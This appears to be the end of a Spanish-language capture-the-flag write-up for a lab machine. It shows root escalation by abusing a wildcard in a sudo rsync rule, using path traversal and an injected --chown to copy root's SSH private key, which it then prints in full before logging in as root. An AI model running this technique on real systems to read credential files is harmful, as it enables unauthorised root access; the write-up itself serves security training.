+                <h2>Escalada de Privilegios a Root - Inyección de Wildcard en Rsync</h2>
+                <p>Como usuario <code>dev</code>, compruebo mis permisos sudo:</p>
+                <pre><code class="language-plaintext">User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* /opt/app/</code></pre>
+
+                <p>Esta regla sudo me permite ejecutar <code>rsync</code> como root con una estructura de comando específica. La vulnerabilidad crítica aquí es el uso del wildcard (<code>*</code>) en la ruta de origen.</p>
+
+                <h3>Entendiendo la Explotación de Wildcard en Rsync</h3>
+                <p>El wildcard crea dos oportunidades de explotación:</p>
+                <ol>
+                    <li><strong>Path Traversal:</strong> La expansión del wildcard me permite atravesar fuera del directorio previsto usando secuencias <code>../</code></li>
+                    <li><strong>Inyección de Argumentos:</strong> Pueden inyectarse argumentos adicionales entre la expansión del wildcard y la ruta de destino</li>
+                </ol>
+
+                <p>Mi estrategia de explotación es usar rsync para copiar la clave privada SSH de root a una ubicación donde pueda leerla, mientras cambio su propiedad al usuario <code>dev</code> usando el flag <code>--chown</code>.</p>
+
+                <h3>Ejecutando el Exploit Final</h3>
+                <p>Elaboro y ejecuto el siguiente comando:</p>
+                <pre><code class="language-bash">sudo rsync -a --exclude=.hg /home/dev/app-production/../../../root/.ssh/id_rsa --chown dev:dev /opt/app/</code></pre>
+
+                <p>Desglosando este comando:</p>
+                <ul>
+                    <li><code>../../../root/.ssh/id_rsa</code> - Atraviesa desde <code>/home/dev/app-production</code> hasta <code>/root/.ssh/id_rsa</code></li>
+                    <li><code>--chown dev:dev</code> - Cambia la propiedad del archivo copiado a <code>dev:dev</code></li>
+                    <li><code>/opt/app/</code> - Directorio de destino</li>
+                </ul>
+
+                <p>Tras ejecutar el comando, ahora puedo leer la clave SSH privada de root:</p>
+                <pre><code class="language-bash">cat /opt/app/id_rsa</code></pre>
+
+                <pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8AAAAJBdGlFYXRpR
+WAAAAAtzc2gtZWQyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8A
+AAAEA+trd9XqxX3ZSG9ESLlPSzIadF8ll0l4ll0+DKkhpkhvy3/CwUede4pnDoZVSY9I88
+e2rHHU33htpO3X/Z6wXwAAAACnJvb3RAeXVtbXkBAgM=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>Guardo esta clave en mi máquina local como <code>id_rsa</code>, establezco los permisos correctos, y me autentico como root:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@yummy.htb</code></pre>
+
+                <p>Esto me otorga acceso root al sistema, permitiéndome recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
